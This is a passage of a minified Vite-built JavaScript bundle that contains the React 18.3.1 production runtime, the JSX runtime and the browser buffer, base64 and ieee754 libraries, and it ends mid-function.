const __vite__mapDeps=(i,m=__vite__mapDeps,d=(m.f||(m.f=["assets/index-B_Dx6GzK.js","assets/nacl-fast-Ct-LxDYi.js","assets/index-CgjqaokM.js"])))=>i.map(i=>d[i]);
var K$=Object.defineProperty;var o1=t=>{throw TypeError(t)};var G$=(t,e,n)=>e in t?K$(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n;var zp=(t,e,n)=>G$(t,typeof e!="symbol"?e+"":e,n),qp=(t,e,n)=>e.has(t)||o1("Cannot "+n);var Ne=(t,e,n)=>(qp(t,e,"read from private field"),n?n.call(t):e.get(t)),Ul=(t,e,n)=>e.has(t)?o1("Cannot add the same private member more than once"):e instanceof WeakSet?e.add(t):e.set(t,n),ch=(t,e,n,r)=>(qp(t,e,"write to private field"),r?r.call(t,n):e.set(t,n),n),wt=(t,e,n)=>(qp(t,e,"access private method"),n);(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const o of i)if(o.type==="childList")for(const l of o.addedNodes)l.tagName==="LINK"&&l.rel==="modulepreload"&&r(l)}).observe(document,{childList:!0,subtree:!0});function n(i){const o={};return i.integrity&&(o.integrity=i.integrity),i.referrerPolicy&&(o.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?o.credentials="include":i.crossOrigin==="anonymous"?o.credentials="omit":o.credentials="same-origin",o}function r(i){if(i.ep)return;i.ep=!0;const o=n(i);fetch(i.href,o)}})();function yf(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}function Mx(t){if(Object.prototype.hasOwnProperty.call(t,"__esModule"))return t;var e=t.default;if(typeof e=="function"){var n=function r(){return this instanceof r?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};n.prototype=e.prototype}else n={};return Object.defineProperty(n,"__esModule",{value:!0}),Object.keys(t).forEach(function(r){var i=Object.getOwnPropertyDescriptor(t,r);Object.defineProperty(n,r,i.get?i:{enumerable:!0,get:function(){return t[r]}})}),n}var Hp={exports:{}},Ml={},Vp={exports:{}},je={},a1;function Y$(){if(a1)return je;a1=1;/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var t=Symbol.for("react.element"),e=Symbol.for("react.portal"),n=Symbol.for("react.fragment"),r=Symbol.for("react.strict_mode"),i=Symbol.for("react.profiler"),o=Symbol.for("react.provider"),l=Symbol.for("react.context"),c=Symbol.for("react.forward_ref"),u=Symbol.for("react.suspense"),f=Symbol.for("react.memo"),d=Symbol.for("react.lazy"),y=Symbol.iterator;function g(F){return F===null||typeof F!="object"?null:(F=y&&F[y]||F["@@iterator"],typeof F=="function"?F:null)}var E={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},w=Object.assign,b={};function m(F,q,Q){this.props=F,this.context=q,this.refs=b,this.updater=Q||E}m.prototype.isReactComponent={},m.prototype.setState=function(F,q){if(typeof F!="object"&&typeof F!="function"&&F!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,F,q,"setState")},m.prototype.forceUpdate=function(F){this.updater.enqueueForceUpdate(this,F,"forceUpdate")};function x(){}x.prototype=m.prototype;function S(F,q,Q){this.props=F,this.context=q,this.refs=b,this.updater=Q||E}var O=S.prototype=new x;O.constructor=S,w(O,m.prototype),O.isPureReactComponent=!0;var $=Array.isArray,R=Object.prototype.hasOwnProperty,T={current:null},D={key:!0,ref:!0,__self:!0,__source:!0};function B(F,q,Q){var te,se={},le=null,pe=null;if(q!=null)for(te in q.ref!==void 0&&(pe=q.ref),q.key!==void 0&&(le=""+q.key),q)R.call(q,te)&&!D.hasOwnProperty(te)&&(se[te]=q[te]);var he=arguments.length-2;if(he===1)se.children=Q;else if(1<he){for(var fe=Array(he),xe=0;xe<he;xe++)fe[xe]=arguments[xe+2];se.children=fe}if(F&&F.defaultProps)for(te in he=F.defaultProps,he)se[te]===void 0&&(se[te]=he[te]);return{$$typeof:t,type:F,key:le,ref:pe,props:se,_owner:T.current}}function k(F,q){return{$$typeof:t,type:F.type,key:q,ref:F.ref,props:F.props,_owner:F._owner}}function G(F){return typeof F=="object"&&F!==null&&F.$$typeof===t}function W(F){var q={"=":"=0",":":"=2"};return"$"+F.replace(/[=:]/g,function(Q){return q[Q]})}var J=/\/+/g;function ne(F,q){return typeof F=="object"&&F!==null&&F.key!=null?W(""+F.key):q.toString(36)}function j(F,q,Q,te,se){var le=typeof F;(le==="undefined"||le==="boolean")&&(F=null);var pe=!1;if(F===null)pe=!0;else switch(le){case"string":case"number":pe=!0;break;case"object":switch(F.$$typeof){case t:case e:pe=!0}}if(pe)return pe=F,se=se(pe),F=te===""?"."+ne(pe,0):te,$(se)?(Q="",F!=null&&(Q=F.replace(J,"$&/")+"/"),j(se,q,Q,"",function(xe){return xe})):se!=null&&(G(se)&&(se=k(se,Q+(!se.key||pe&&pe.key===se.key?"":(""+se.key).replace(J,"$&/")+"/")+F)),q.push(se)),1;if(pe=0,te=te===""?".":te+":",$(F))for(var he=0;he<F.length;he++){le=F[he];var fe=te+ne(le,he);pe+=j(le,q,Q,fe,se)}else if(fe=g(F),typeof fe=="function")for(F=fe.call(F),he=0;!(le=F.next()).done;)le=le.value,fe=te+ne(le,he++),pe+=j(le,q,Q,fe,se);else if(le==="object")throw q=String(F),Error("Objects are not valid as a React child (found: "+(q==="[object Object]"?"object with keys {"+Object.keys(F).join(", ")+"}":q)+"). If you meant to render a collection of children, use an array instead.");return pe}function A(F,q,Q){if(F==null)return F;var te=[],se=0;return j(F,te,"","",function(le){return q.call(Q,le,se++)}),te}function C(F){if(F._status===-1){var q=F._result;q=q(),q.then(function(Q){(F._status===0||F._status===-1)&&(F._status=1,F._result=Q)},function(Q){(F._status===0||F._status===-1)&&(F._status=2,F._result=Q)}),F._status===-1&&(F._status=0,F._result=q)}if(F._status===1)return F._result.default;throw F._result}var U={current:null},M={transition:null},N={ReactCurrentDispatcher:U,ReactCurrentBatchConfig:M,ReactCurrentOwner:T};function V(){throw Error("act(...) is not supported in production builds of React.")}return je.Children={map:A,forEach:function(F,q,Q){A(F,function(){q.apply(this,arguments)},Q)},count:function(F){var q=0;return A(F,function(){q++}),q},toArray:function(F){return A(F,function(q){return q})||[]},only:function(F){if(!G(F))throw Error("React.Children.only expected to receive a single React element child.");return F}},je.Component=m,je.Fragment=n,je.Profiler=i,je.PureComponent=S,je.StrictMode=r,je.Suspense=u,je.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=N,je.act=V,je.cloneElement=function(F,q,Q){if(F==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+F+".");var te=w({},F.props),se=F.key,le=F.ref,pe=F._owner;if(q!=null){if(q.ref!==void 0&&(le=q.ref,pe=T.current),q.key!==void 0&&(se=""+q.key),F.type&&F.type.defaultProps)var he=F.type.defaultProps;for(fe in q)R.call(q,fe)&&!D.hasOwnProperty(fe)&&(te[fe]=q[fe]===void 0&&he!==void 0?he[fe]:q[fe])}var fe=arguments.length-2;if(fe===1)te.children=Q;else if(1<fe){he=Array(fe);for(var xe=0;xe<fe;xe++)he[xe]=arguments[xe+2];te.children=he}return{$$typeof:t,type:F.type,key:se,ref:le,props:te,_owner:pe}},je.createContext=function(F){return F={$$typeof:l,_currentValue:F,_currentValue2:F,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},F.Provider={$$typeof:o,_context:F},F.Consumer=F},je.createElement=B,je.createFactory=function(F){var q=B.bind(null,F);return q.type=F,q},je.createRef=function(){return{current:null}},je.forwardRef=function(F){return{$$typeof:c,render:F}},je.isValidElement=G,je.lazy=function(F){return{$$typeof:d,_payload:{_status:-1,_result:F},_init:C}},je.memo=function(F,q){return{$$typeof:f,type:F,compare:q===void 0?null:q}},je.startTransition=function(F){var q=M.transition;M.transition={};try{F()}finally{M.transition=q}},je.unstable_act=V,je.useCallback=function(F,q){return U.current.useCallback(F,q)},je.useContext=function(F){return U.current.useContext(F)},je.useDebugValue=function(){},je.useDeferredValue=function(F){return U.current.useDeferredValue(F)},je.useEffect=function(F,q){return U.current.useEffect(F,q)},je.useId=function(){return U.current.useId()},je.useImperativeHandle=function(F,q,Q){return U.current.useImperativeHandle(F,q,Q)},je.useInsertionEffect=function(F,q){return U.current.useInsertionEffect(F,q)},je.useLayoutEffect=function(F,q){return U.current.useLayoutEffect(F,q)},je.useMemo=function(F,q){return U.current.useMemo(F,q)},je.useReducer=function(F,q,Q){return U.current.useReducer(F,q,Q)},je.useRef=function(F){return U.current.useRef(F)},je.useState=function(F){return U.current.useState(F)},je.useSyncExternalStore=function(F,q,Q){return U.current.useSyncExternalStore(F,q,Q)},je.useTransition=function(){return U.current.useTransition()},je.version="18.3.1",je}var l1;function mf(){return l1||(l1=1,Vp.exports=Y$()),Vp.exports}/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var c1;function J$(){if(c1)return Ml;c1=1;var t=mf(),e=Symbol.for("react.element"),n=Symbol.for("react.fragment"),r=Object.prototype.hasOwnProperty,i=t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,o={key:!0,ref:!0,__self:!0,__source:!0};function l(c,u,f){var d,y={},g=null,E=null;f!==void 0&&(g=""+f),u.key!==void 0&&(g=""+u.key),u.ref!==void 0&&(E=u.ref);for(d in u)r.call(u,d)&&!o.hasOwnProperty(d)&&(y[d]=u[d]);if(c&&c.defaultProps)for(d in u=c.defaultProps,u)y[d]===void 0&&(y[d]=u[d]);return{$$typeof:e,type:c,key:g,ref:E,props:y,_owner:i.current}}return Ml.Fragment=n,Ml.jsx=l,Ml.jsxs=l,Ml}var u1;function Z$(){return u1||(u1=1,Hp.exports=J$()),Hp.exports}var H=Z$(),Wp={},Fl={},h1;function Q$(){if(h1)return Fl;h1=1,Fl.byteLength=c,Fl.toByteArray=f,Fl.fromByteArray=g;for(var t=[],e=[],n=typeof Uint8Array<"u"?Uint8Array:Array,r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",i=0,o=r.length;i<o;++i)t[i]=r[i],e[r.charCodeAt(i)]=i;e[45]=62,e[95]=63;function l(E){var w=E.length;if(w%4>0)throw new Error("Invalid string. Length must be a multiple of 4");var b=E.indexOf("=");b===-1&&(b=w);var m=b===w?0:4-b%4;return[b,m]}function c(E){var w=l(E),b=w[0],m=w[1];return(b+m)*3/4-m}function u(E,w,b){return(w+b)*3/4-b}function f(E){var w,b=l(E),m=b[0],x=b[1],S=new n(u(E,m,x)),O=0,$=x>0?m-4:m,R;for(R=0;R<$;R+=4)w=e[E.charCodeAt(R)]<<18|e[E.charCodeAt(R+1)]<<12|e[E.charCodeAt(R+2)]<<6|e[E.charCodeAt(R+3)],S[O++]=w>>16&255,S[O++]=w>>8&255,S[O++]=w&255;return x===2&&(w=e[E.charCodeAt(R)]<<2|e[E.charCodeAt(R+1)]>>4,S[O++]=w&255),x===1&&(w=e[E.charCodeAt(R)]<<10|e[E.charCodeAt(R+1)]<<4|e[E.charCodeAt(R+2)]>>2,S[O++]=w>>8&255,S[O++]=w&255),S}function d(E){return t[E>>18&63]+t[E>>12&63]+t[E>>6&63]+t[E&63]}function y(E,w,b){for(var m,x=[],S=w;S<b;S+=3)m=(E[S]<<16&16711680)+(E[S+1]<<8&65280)+(E[S+2]&255),x.push(d(m));return x.join("")}function g(E){for(var w,b=E.length,m=b%3,x=[],S=16383,O=0,$=b-m;O<$;O+=S)x.push(y(E,O,O+S>$?$:O+S));return m===1?(w=E[b-1],x.push(t[w>>2]+t[w<<4&63]+"==")):m===2&&(w=(E[b-2]<<8)+E[b-1],x.push(t[w>>10]+t[w>>4&63]+t[w<<2&63]+"=")),x.join("")}return Fl}var uh={};/*! ieee754. BSD-3-Clause License. Feross Aboukhadijeh <https://feross.org/opensource> */var f1;function X$(){return f1||(f1=1,uh.read=function(t,e,n,r,i){var o,l,c=i*8-r-1,u=(1<<c)-1,f=u>>1,d=-7,y=n?i-1:0,g=n?-1:1,E=t[e+y];for(y+=g,o=E&(1<<-d)-1,E>>=-d,d+=c;d>0;o=o*256+t[e+y],y+=g,d-=8);for(l=o&(1<<-d)-1,o>>=-d,d+=r;d>0;l=l*256+t[e+y],y+=g,d-=8);if(o===0)o=1-f;else{if(o===u)return l?NaN:(E?-1:1)*(1/0);l=l+Math.pow(2,r),o=o-f}return(E?-1:1)*l*Math.pow(2,o-r)},uh.write=function(t,e,n,r,i,o){var l,c,u,f=o*8-i-1,d=(1<<f)-1,y=d>>1,g=i===23?Math.pow(2,-24)-Math.pow(2,-77):0,E=r?0:o-1,w=r?1:-1,b=e<0||e===0&&1/e<0?1:0;for(e=Math.abs(e),isNaN(e)||e===1/0?(c=isNaN(e)?1:0,l=d):(l=Math.floor(Math.log(e)/Math.LN2),e*(u=Math.pow(2,-l))<1&&(l--,u*=2),l+y>=1?e+=g/u:e+=g*Math.pow(2,1-y),e*u>=2&&(l++,u/=2),l+y>=d?(c=0,l=d):l+y>=1?(c=(e*u-1)*Math.pow(2,i),l=l+y):(c=e*Math.pow(2,y-1)*Math.pow(2,i),l=0));i>=8;t[n+E]=c&255,E+=w,c/=256,i-=8);for(l=l<<i|c,f+=i;f>0;t[n+E]=l&255,E+=w,l/=256,f-=8);t[n+E-w]|=b*128}),uh}/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */var d1;function eP(){return d1||(d1=1,function(t){const e=Q$(),n=X$(),r=typeof Symbol=="function"&&typeof Symbol.for=="function"?Symbol.for("nodejs.util.inspect.custom"):null;t.Buffer=c,t.SlowBuffer=S,t.INSPECT_MAX_BYTES=50;const i=2147483647;t.kMaxLength=i,c.TYPED_ARRAY_SUPPORT=o(),!c.TYPED_ARRAY_SUPPORT&&typeof console<"u"&&typeof console.error=="function"&&console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support.");function o(){try{const z=new Uint8Array(1),I={foo:function(){return 42}};return Object.setPrototypeOf(I,Uint8Array.prototype),Object.setPrototypeOf(z,I),z.foo()===42}catch{return!1}}Object.defineProperty(c.prototype,"parent",{enumerable:!0,get:function(){if(c.isBuffer(this))return this.buffer}}),Object.defineProperty(c.prototype,"offset",{enumerable:!0,get:function(){if(c.isBuffer(this))return this.byteOffset}});function l(z){if(z>i)throw new RangeError('The value "'+z+'" is invalid for option "size"');const I=new Uint8Array(z);return Object.setPrototypeOf(I,c.prototype),I}function c(z,I,P){if(typeof z=="number"){if(typeof I=="string")throw new TypeError('The "string" argument must be of type string. Received type number');return y(z)}return u(z,I,P)}c.poolSize=8192;function u(z,I,P){if(typeof z=="string")return g(z,I);if(ArrayBuffer.isView(z))return w(z);if(z==null)throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof z);if(Qt(z,ArrayBuffer)||z&&Qt(z.buffer,ArrayBuffer)||typeof SharedArrayBuffer<"u"&&(Qt(z,SharedArrayBuffer)||z&&Qt(z.buffer,SharedArrayBuffer)))return b(z,I,P);if(typeof z=="number")throw new TypeError('The "value" argument must not be of type number. Received type number');const K=z.valueOf&&z.valueOf();if(K!=null&&K!==z)return c.from(K,I,P);const ee=m(z);if(ee)return ee;if(typeof Symbol<"u"&&Symbol.toPrimitive!=null&&typeof z[Symbol.toPrimitive]=="function")return c.from(z[Symbol.toPrimitive]("string"),I,P);throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof z)}c.from=function(z,I,P){return u(z,I,P)},Object.setPrototypeOf(c.prototype,Uint8Array.prototype),Object.setPrototypeOf(c,Uint8Array);function f(z){if(typeof z!="number")throw new TypeError('"size" argument must be of type number');if(z<0)throw new RangeError('The value "'+z+'" is invalid for option "size"')}function d(z,I,P){return f(z),z<=0?l(z):I!==void 0?typeof P=="string"?l(z).fill(I,P):l(z).fill(I):l(z)}c.alloc=function(z,I,P){return d(z,I,P)};function y(z){return f(z),l(z<0?0:x(z)|0)}c.allocUnsafe=function(z){return y(z)},c.allocUnsafeSlow=function(z){return y(z)};function g(z,I){if((typeof I!="string"||I==="")&&(I="utf8"),!c.isEncoding(I))throw new TypeError("Unknown encoding: "+I);const P=O(z,I)|0;let K=l(P);const ee=K.write(z,I);return ee!==P&&(K=K.slice(0,ee)),K}function E(z){const I=z.length<0?0:x(z.length)|0,P=l(I);for(let K=0;K<I;K+=1)P[K]=z[K]&255;return P}function w(z){if(Qt(z,Uint8Array)){const I=new Uint8Array(z);return b(I.buffer,I.byteOffset,I.byteLength)}return E(z)}function b(z,I,P){if(I<0||z.byteLength<I)throw new RangeError('"offset" is outside of buffer bounds');if(z.byteLength<I+(P||0))throw new RangeError('"length" is outside of buffer bounds');let K;return I===void 0&&P===void 0?K=new Uint8Array(z):P===void 0?K=new Uint8Array(z,I):K=new Uint8Array(z,I,P),Object.setPrototypeOf(K,c.prototype),K}function m(z){if(c.isBuffer(z)){const I=x(z.length)|0,P=l(I);return P.length===0||z.copy(P,0,0,I),P}if(z.length!==void 0)return typeof z.length!="number"||ii(z.length)?l(0):E(z);if(z.type==="Buffer"&&Array.isArray(z.data))return E(z.data)}function x(z){if(z>=i)throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+i.toString(16)+" bytes");return z|0}function S(z){return+z!=z&&(z=0),c.alloc(+z)}c.isBuffer=function(I){return I!=null&&I._isBuffer===!0&&I!==c.prototype},c.compare=function(I,P){if(Qt(I,Uint8Array)&&(I=c.from(I,I.offset,I.byteLength)),Qt(P,Uint8Array)&&(P=c.from(P,P.offset,P.byteLength)),!c.isBuffer(I)||!c.isBuffer(P))throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');if(I===P)return 0;let K=I.length,ee=P.length;for(let ae=0,de=Math.min(K,ee);ae<de;++ae)if(I[ae]!==P[ae]){K=I[ae],ee=P[ae];break}return K<ee?-1:ee<K?1:0},c.isEncoding=function(I){switch(String(I).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},c.concat=function(I,P){if(!Array.isArray(I))throw new TypeError('"list" argument must be an Array of Buffers');if(I.length===0)return c.alloc(0);let K;if(P===void 0)for(P=0,K=0;K<I.length;++K)P+=I[K].length;const ee=c.allocUnsafe(P);let ae=0;for(K=0;K<I.length;++K){let de=I[K];if(Qt(de,Uint8Array))ae+de.length>ee.length?(c.isBuffer(de)||(de=c.from(de)),de.copy(ee,ae)):Uint8Array.prototype.set.call(ee,de,ae);else if(c.isBuffer(de))de.copy(ee,ae);else throw new TypeError('"list" argument must be an Array of Buffers');ae+=de.length}return ee};function O(z,I){if(c.isBuffer(z))return z.length;if(ArrayBuffer.isView(z)||Qt(z,ArrayBuffer))return z.byteLength;if(typeof z!="string")throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+typeof z);const P=z.length,K=arguments.length>2&&arguments[2]===!0;if(!K&&P===0)return 0;let ee=!1;for(;;)switch(I){case"ascii":case"latin1":case"binary":return P;case"utf8":case"utf-8":return ri(z).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return P*2;case"hex":return P>>>1;case"base64":return mr(z).length;default:if(ee)return K?-1:ri(z).length;I=(""+I).toLowerCase(),ee=!0}}c.byteLength=O;function $(z,I,P){let K=!1;if((I===void 0||I<0)&&(I=0),I>this.length||((P===void 0||P>this.length)&&(P=this.length),P<=0)||(P>>>=0,I>>>=0,P<=I))return"";for(z||(z="utf8");;)switch(z){case"hex":return N(this,I,P);case"utf8":case"utf-8":return j(this,I,P);case"ascii":return U(this,I,P);case"latin1":case"binary":return M(this,I,P);case"base64":return ne(this,I,P);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return V(this,I,P);default:if(K)throw new TypeError("Unknown encoding: "+z);z=(z+"").toLowerCase(),K=!0}}c.prototype._isBuffer=!0;function R(z,I,P){const K=z[I];z[I]=z[P],z[P]=K}c.prototype.swap16=function(){const I=this.length;if(I%2!==0)throw new RangeError("Buffer size must be a multiple of 16-bits");for(let P=0;P<I;P+=2)R(this,P,P+1);return this},c.prototype.swap32=function(){const I=this.length;if(I%4!==0)throw new RangeError("Buffer size must be a multiple of 32-bits");for(let P=0;P<I;P+=4)R(this,P,P+3),R(this,P+1,P+2);return this},c.prototype.swap64=function(){const I=this.length;if(I%8!==0)throw new RangeError("Buffer size must be a multiple of 64-bits");for(let P=0;P<I;P+=8)R(this,P,P+7),R(this,P+1,P+6),R(this,P+2,P+5),R(this,P+3,P+4);return this},c.prototype.toString=function(){const I=this.length;return I===0?"":arguments.length===0?j(this,0,I):$.apply(this,arguments)},c.prototype.toLocaleString=c.prototype.toString,c.prototype.equals=function(I){if(!c.isBuffer(I))throw new TypeError("Argument must be a Buffer");return this===I?!0:c.compare(this,I)===0},c.prototype.inspect=function(){let I="";const P=t.INSPECT_MAX_BYTES;return I=this.toString("hex",0,P).replace(/(.{2})/g,"$1 ").trim(),this.length>P&&(I+=" ... "),"<Buffer "+I+">"},r&&(c.prototype[r]=c.prototype.inspect),c.prototype.compare=function(I,P,K,ee,ae){if(Qt(I,Uint8Array)&&(I=c.from(I,I.offset,I.byteLength)),!c.isBuffer(I))throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type '+typeof I);if(P===void 0&&(P=0),K===void 0&&(K=I?I.length:0),ee===void 0&&(ee=0),ae===void 0&&(ae=this.length),P<0||K>I.length||ee<0||ae>this.length)throw new RangeError("out of range index");if(ee>=ae&&P>=K)return 0;if(ee>=ae)return-1;if(P>=K)return 1;if(P>>>=0,K>>>=0,ee>>>=0,ae>>>=0,this===I)return 0;let de=ae-ee,Be=K-P;const pt=Math.min(de,Be),Xe=this.slice(ee,ae),ot=I.slice(P,K);for(let Ye=0;Ye<pt;++Ye)if(Xe[Ye]!==ot[Ye]){de=Xe[Ye],Be=ot[Ye];break}return de<Be?-1:Be<de?1:0};function T(z,I,P,K,ee){if(z.length===0)return-1;if(typeof P=="string"?(K=P,P=0):P>2147483647?P=2147483647:P<-2147483648&&(P=-2147483648),P=+P,ii(P)&&(P=ee?0:z.length-1),P<0&&(P=z.length+P),P>=z.length){if(ee)return-1;P=z.length-1}else if(P<0)if(ee)P=0;else return-1;if(typeof I=="string"&&(I=c.from(I,K)),c.isBuffer(I))return I.length===0?-1:D(z,I,P,K,ee);if(typeof I=="number")return I=I&255,typeof Uint8Array.prototype.indexOf=="function"?ee?Uint8Array.prototype.indexOf.call(z,I,P):Uint8Array.prototype.lastIndexOf.call(z,I,P):D(z,[I],P,K,ee);throw new TypeError("val must be string, number or Buffer")}function D(z,I,P,K,ee){let ae=1,de=z.length,Be=I.length;if(K!==void 0&&(K=String(K).toLowerCase(),K==="ucs2"||K==="ucs-2"||K==="utf16le"||K==="utf-16le")){if(z.length<2||I.length<2)return-1;ae=2,de/=2,Be/=2,P/=2}function pt(ot,Ye){return ae===1?ot[Ye]:ot.readUInt16BE(Ye*ae)}let Xe;if(ee){let ot=-1;for(Xe=P;Xe<de;Xe++)if(pt(z,Xe)===pt(I,ot===-1?0:Xe-ot)){if(ot===-1&&(ot=Xe),Xe-ot+1===Be)return ot*ae}else ot!==-1&&(Xe-=Xe-ot),ot=-1}else for(P+Be>de&&(P=de-Be),Xe=P;Xe>=0;Xe--){let ot=!0;for(let Ye=0;Ye<Be;Ye++)if(pt(z,Xe+Ye)!==pt(I,Ye)){ot=!1;break}if(ot)return Xe}return-1}c.prototype.includes=function(I,P,K){return this.indexOf(I,P,K)!==-1},c.prototype.indexOf=function(I,P,K){return T(this,I,P,K,!0)},c.prototype.lastIndexOf=function(I,P,K){return T(this,I,P,K,!1)};function B(z,I,P,K){P=Number(P)||0;const ee=z.length-P;K?(K=Number(K),K>ee&&(K=ee)):K=ee;const ae=I.length;K>ae/2&&(K=ae/2);let de;for(de=0;de<K;++de){const Be=parseInt(I.substr(de*2,2),16);if(ii(Be))return de;z[P+de]=Be}return de}function k(z,I,P,K){return mn(ri(I,z.length-P),z,P,K)}function G(z,I,P,K){return mn(wo(I),z,P,K)}function W(z,I,P,K){return mn(mr(I),z,P,K)}function J(z,I,P,K){return mn(ji(I,z.length-P),z,P,K)}c.prototype.write=function(I,P,K,ee){if(P===void 0)ee="utf8",K=this.length,P=0;else if(K===void 0&&typeof P=="string")ee=P,K=this.length,P=0;else if(isFinite(P))P=P>>>0,isFinite(K)?(K=K>>>0,ee===void 0&&(ee="utf8")):(ee=K,K=void 0);else throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");const ae=this.length-P;if((K===void 0||K>ae)&&(K=ae),I.length>0&&(K<0||P<0)||P>this.length)throw new RangeError("Attempt to write outside buffer bounds");ee||(ee="utf8");let de=!1;for(;;)switch(ee){case"hex":return B(this,I,P,K);case"utf8":case"utf-8":return k(this,I,P,K);case"ascii":case"latin1":case"binary":return G(this,I,P,K);case"base64":return W(this,I,P,K);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return J(this,I,P,K);default:if(de)throw new TypeError("Unknown encoding: "+ee);ee=(""+ee).toLowerCase(),de=!0}},c.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}};function ne(z,I,P){return I===0&&P===z.length?e.fromByteArray(z):e.fromByteArray(z.slice(I,P))}function j(z,I,P){P=Math.min(z.length,P);const K=[];let ee=I;for(;ee<P;){const ae=z[ee];let de=null,Be=ae>239?4:ae>223?3:ae>191?2:1;if(ee+Be<=P){let pt,Xe,ot,Ye;switch(Be){case 1:ae<128&&(de=ae);break;case 2:pt=z[ee+1],(pt&192)===128&&(Ye=(ae&31)<<6|pt&63,Ye>127&&(de=Ye));break;case 3:pt=z[ee+1],Xe=z[ee+2],(pt&192)===128&&(Xe&192)===128&&(Ye=(ae&15)<<12|(pt&63)<<6|Xe&63,Ye>2047&&(Ye<55296||Ye>57343)&&(de=Ye));break;case 4:pt=z[ee+1],Xe=z[ee+2],ot=z[ee+3],(pt&192)===128&&(Xe&192)===128&&(ot&192)===128&&(Ye=(ae&15)<<18|(pt&63)<<12|(Xe&63)<<6|ot&63,Ye>65535&&Ye<1114112&&(de=Ye))}}de===null?(de=65533,Be=1):de>65535&&(de-=65536,K.push(de>>>10&1023|55296),de=56320|de&1023),K.push(de),ee+=Be}return C(K)}const A=4096;function C(z){const I=z.length;if(I<=A)return String.fromCharCode.apply(String,z);let P="",K=0;for(;K<I;)P+=String.fromCharCode.apply(String,z.slice(K,K+=A));return P}function U(z,I,P){let K="";P=Math.min(z.length,P);for(let ee=I;ee<P;++ee)K+=String.fromCharCode(z[ee]&127);return K}function M(z,I,P){let K="";P=Math.min(z.length,P);for(let ee=I;ee<P;++ee)K+=String.fromCharCode(z[ee]);return K}function N(z,I,P){const K=z.length;(!I||I<0)&&(I=0),(!P||P<0||P>K)&&(P=K);let ee="";for(let ae=I;ae<P;++ae)ee+=Es[z[ae]];return ee}function V(z,I,P){const K=z.slice(I,P);let ee="";for(let ae=0;ae<K.length-1;ae+=2)ee+=String.fromCharCode(K[ae]+K[ae+1]*256);return ee}c.prototype.slice=function(I,P){const K=this.length;I=~~I,P=P===void 0?K:~~P,I<0?(I+=K,I<0&&(I=0)):I>K&&(I=K),P<0?(P+=K,P<0&&(P=0)):P>K&&(P=K),P<I&&(P=I);const ee=this.subarray(I,P);return Object.setPrototypeOf(ee,c.prototype),ee};function F(z,I,P){if(z%1!==0||z<0)throw new RangeError("offset is not uint");if(z+I>P)throw new RangeError("Trying to access beyond buffer length")}c.prototype.readUintLE=c.prototype.readUIntLE=function(I,P,K){I=I>>>0,P=P>>>0,K||F(I,P,this.length);let ee=this[I],ae=1,de=0;for(;++de<P&&(ae*=256);)ee+=this[I+de]*ae;return ee},c.prototype.readUintBE=c.prototype.readUIntBE=function(I,P,K){I=I>>>0,P=P>>>0,K||F(I,P,this.length);let ee=this[I+--P],ae=1;for(;P>0&&(ae*=256);)ee+=this[I+--P]*ae;return ee},c.prototype.readUint8=c.prototype.readUInt8=function(I,P){return I=I>>>0,P||F(I,1,this.length),this[I]},c.prototype.readUint16LE=c.prototype.readUInt16LE=function(I,P){return I=I>>>0,P||F(I,2,this.length),this[I]|this[I+1]<<8},c.prototype.readUint16BE=c.prototype.readUInt16BE=function(I,P){return I=I>>>0,P||F(I,2,this.length),this[I]<<8|this[I+1]},c.prototype.readUint32LE=c.prototype.readUInt32LE=function(I,P){return I=I>>>0,P||F(I,4,this.length),(this[I]|this[I+1]<<8|this[I+2]<<16)+this[I+3]*16777216},c.prototype.readUint32BE=c.prototype.readUInt32BE=function(I,P){return I=I>>>0,P||F(I,4,this.length),this[I]*16777216+(this[I+1]<<16|this[I+2]<<8|this[I+3])},c.prototype.readBigUInt64LE=_n(function(I){I=I>>>0,Re(I,"offset");const P=this[I],K=this[I+7];(P===void 0||K===void 0)&&Ue(I,this.length-8);const ee=P+this[++I]*2**8+this[++I]*2**16+this[++I]*2**24,ae=this[++I]+this[++I]*2**8+this[++I]*2**16+K*2**24;return 